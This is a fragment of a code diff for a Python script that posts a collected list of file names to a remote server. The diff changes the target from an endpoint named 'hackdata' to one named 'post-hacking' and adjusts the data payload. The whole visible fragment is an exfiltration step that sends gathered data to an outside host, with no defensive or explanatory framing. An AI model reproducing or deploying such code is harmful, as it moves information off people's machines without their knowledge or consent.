@@ -15,11 +15,10 @@ print(strFileNames)
 
 # post to api
 
-url = 'https://104.248.39.146:8888/hackdata/post'
-
+url = 'http://172.31.176.88:8000/post-hacking'
 # data = {'source':"uncle999", "data":"hello loong"}
 
-data = {'source':"uncle999", "data":strFileNames}
+data = {"source":"uncle999", "data":strFileNames}
 
 r = requests.post(url=url, data=data)
 print(r.text)
